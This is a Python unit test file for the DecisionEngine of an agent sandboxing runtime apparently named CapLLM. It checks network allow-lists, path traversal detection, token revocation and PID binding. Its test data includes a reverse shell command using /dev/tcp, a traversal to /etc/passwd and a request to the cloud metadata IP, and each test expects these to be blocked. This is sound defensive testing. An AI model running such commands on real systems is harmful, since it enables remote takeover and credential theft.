"""
Unit tests for CapLLM runtime DecisionEngine.

Note on Scope:
These tests validate the supervisor's dual-path policy evaluation and deep parameter
validation engine in userspace. They do not simulate or claim Linux kernel seccomp-bpf
or namespace enforcement.
"""

from __future__ import annotations

import os
import tempfile
import time
import unittest

from capllm.core.audit import AuditLogger, Verdict
from capllm.core.capability import CapabilityManager, normalize_path
from capllm.runtime.interceptor import (
    DecisionEngine,
    MediationPath,
    SyscallRequest,
)


class TestDecisionEngine(unittest.TestCase):
    def setUp(self) -> None:
        self.temp_dir = tempfile.TemporaryDirectory()
        self.workspace = normalize_path(self.temp_dir.name)
        self.audit = AuditLogger()
        self.caps = CapabilityManager(audit_logger=self.audit)
        self.engine = DecisionEngine(self.caps, self.audit)

        # Issue token for tenant_a, pid=5000
        self.token = self.caps.issue_token(
            tenant_id="tenant_a",
            agent_id="agent_a",
            allowed_paths={self.workspace: {"read", "write"}},
            allowed_syscalls={"openat", "read", "write", "connect", "execve"},
            allowed_network_endpoints=[("127.0.0.1", 8080)],
            pid=5000,
        )

    def tearDown(self) -> None:
        self.temp_dir.cleanup()

    def _make_req(
        self,
        syscall: str,
        resource: str,
        perm: str = "-",
        pid: int = 5000,
        args: dict | None = None,
    ) -> SyscallRequest:
        return SyscallRequest(
            seq=1,
            pid=pid,
            tenant_id="tenant_a",
            agent_id="agent_a",
            syscall=syscall,
            resource=resource,
            perm=perm,
            cwd=self.workspace,
            args=args or {},
            audit_event="test",
            received_at=time.time(),
        )

    def test_fast_path_allowed_and_cache_hit(self) -> None:
        """Low-risk permitted file access uses the fast path and caches decisions."""
        target_file = os.path.join(self.workspace, "data.txt")
        req = self._make_req("openat", target_file, perm="read")

        # First request: Fast path cache miss
        dec1 = self.engine.decide(self.token.token_id, req)
        self.assertEqual(dec1.verdict, Verdict.ALLOW)
        self.assertEqual(dec1.path, MediationPath.FAST)
        self.assertFalse(dec1.cache_hit)

        # Second request: Fast path cache hit
        dec2 = self.engine.decide(self.token.token_id, req)
        self.assertEqual(dec2.verdict, Verdict.ALLOW)
        self.assertEqual(dec2.path, MediationPath.FAST)
        self.assertTrue(dec2.cache_hit)

    def test_slow_path_escalation_network_allow_and_deny(self) -> None:
        """Network syscalls escalate to slow path and enforce allow-list."""
        # Whitelisted endpoint -> SLOW path ALLOW
        req_allowed = self._make_req(
            "connect", "127.0.0.1:8080", args={"host": "127.0.0.1", "port": "8080"}
        )
        dec_allow = self.engine.decide(self.token.token_id, req_allowed)
        self.assertEqual(dec_allow.verdict, Verdict.ALLOW)
        self.assertEqual(dec_allow.path, MediationPath.SLOW)

        # Unwhitelisted endpoint -> SLOW path BLOCK
        req_blocked = self._make_req(
            "connect", "203.0.113.5:80", args={"host": "203.0.113.5", "port": "80"}
        )
        dec_block = self.engine.decide(self.token.token_id, req_blocked)
        self.assertEqual(dec_block.verdict, Verdict.BLOCK)
        self.assertEqual(dec_block.path, MediationPath.SLOW)

        # Cloud metadata IP (169.254.169.254) -> unconditionally BLOCK
        req_meta = self._make_req(
            "connect", "169.254.169.254:80", args={"host": "169.254.169.254", "port": "80"}
        )
        dec_meta = self.engine.decide(self.token.token_id, req_meta)
        self.assertEqual(dec_meta.verdict, Verdict.BLOCK)
        self.assertIn("metadata", dec_meta.reason)

    def test_slow_path_path_traversal_detection(self) -> None:
        """Path traversal sequences are escalated to slow path and validated."""
        # Benign traversal that stays inside sandbox -> SLOW path ALLOW
        inside_traversal = os.path.join(self.workspace, "subdir/../data.txt")
        req_inside = self._make_req("openat", inside_traversal, perm="read")
        dec_inside = self.engine.decide(self.token.token_id, req_inside)
        self.assertEqual(dec_inside.verdict, Verdict.ALLOW)
        self.assertEqual(dec_inside.path, MediationPath.SLOW)

        # Malicious traversal that escapes sandbox -> SLOW path BLOCK
        outside_traversal = os.path.join(self.workspace, "../../etc/passwd")
        req_outside = self._make_req("openat", outside_traversal, perm="read")
        dec_outside = self.engine.decide(self.token.token_id, req_outside)
        self.assertEqual(dec_outside.verdict, Verdict.BLOCK)
        self.assertIn("escapes sandbox", dec_outside.reason)

    def test_slow_path_reverse_shell_blocked(self) -> None:
        """execve with reverse shell arguments is deeply inspected and blocked."""
        req_shell = self._make_req(
            "execve",
            "/bin/sh",
            perm="exec",
            args={"argv": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
        )
        dec = self.engine.decide(self.token.token_id, req_shell)
        self.assertEqual(dec.verdict, Verdict.BLOCK)
        self.assertIn("reverse-shell", dec.reason)

    def test_revocation_blocks_immediately(self) -> None:
        """A revoked token produces an immediate BLOCK verdict."""
        self.caps.revoke_token(self.token.token_id, reason="Security anomaly")
        req = self._make_req("openat", os.path.join(self.workspace, "data.txt"), perm="read")
        dec = self.engine.decide(self.token.token_id, req)
        self.assertEqual(dec.verdict, Verdict.BLOCK)
        self.assertIn("revoked", dec.reason)

    def test_pid_mismatch_blocked(self) -> None:
        """Requests with PID not matching bound token PID are rejected at Gate 1."""
        req = self._make_req("openat", os.path.join(self.workspace, "data.txt"), perm="read", pid=9999)
        dec = self.engine.decide(self.token.token_id, req)
        self.assertEqual(dec.verdict, Verdict.BLOCK)
        self.assertIn("pid", dec.reason)


if __name__ == "__main__":
    unittest.main()
